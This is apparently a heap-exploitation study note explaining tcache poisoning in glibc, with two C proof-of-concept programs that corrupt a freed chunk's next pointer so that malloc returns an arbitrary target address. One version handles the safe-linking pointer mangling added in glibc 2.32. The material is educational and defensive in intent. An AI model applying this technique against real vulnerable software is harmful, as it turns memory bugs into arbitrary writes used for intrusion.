<details>
<summary><strong>Description</strong></summary>
<p>

the tcache works as a linked list, and relies on the next pointers. When a chunk from the tcache gets allocated, it allocates the head of an individual tcache linked list, and its next ptr becomes the head...

this attack relies on altering the next ptr of a tcache chunk. After we have altered the next ptr of a tcache chunk, and allocate the altered chunk, the next allocation should give us a memory chunk at an address of our choosing...

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/tcache/tcache_linked_list/readme.md
- https://github.com/shellphish/how2heap/blob/master/glibc_2.39/tcache_poisoning.c
- https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c

</p>
</details>

### For `2.32+` versions

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long x[0x10], *target, *chunk0, *chunk1, *chunk2;

    // target must be aligned 0x10
    for(int i = 0; i < 0x10; i++) {
        if((((long)&x[i]) & 0xF) == 0) {
            target = &x[i];
            break;
        }
    }

    printf("target: %p\n", target);

    chunk0 = malloc(0x18);
    chunk1 = malloc(0x18); // two chunks must be the same size, or else they will go to different tcache

    free(chunk0);
    free(chunk1); 
    // [tcache 0x20]: chunk1 -> chunk0

    // VULNERABILITY
    chunk1[0] = (long)target ^ ((long)chunk1 >> 12); // ptr mangled since glibc 2.32
    // VULNERABILITY
    // [tcache 0x20]: chunk1 -> target
    
    malloc(0x18); // padding
    // [tcache 0x20]: target

    chunk2 = malloc(0x18);
    // [tcache 0x20]: (empty)

    printf("chunk2: %p\n", chunk2);
}
```

</p>
</details>

### For `2.31` version

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long x[0x10], *target, *chunk0, *chunk1, *chunk2;

    // target doesnt need to aligned 0x10 in 2.31
    target = (char *)(&x[2]) - 2;

    printf("target: %p\n", target);

    chunk0 = malloc(0x18);
    chunk1 = malloc(0x18); // two chunks must be the same size, or else they will go to different tcache

    free(chunk0);
    free(chunk1); 
    // [tcache 0x20]: chunk1 -> chunk0

    // VULNERABILITY
    chunk1[0] = (long)target; // no mangled pointer in glibc 2.31
    // VULNERABILITY
    // [tcache 0x20]: chunk1 -> target
    
    malloc(0x18); // padding
    // [tcache 0x20]: target

    chunk2 = malloc(0x18);
    // [tcache 0x20]: (empty)

    printf("chunk2: %p\n", chunk2);
}
```

</p>
</details>
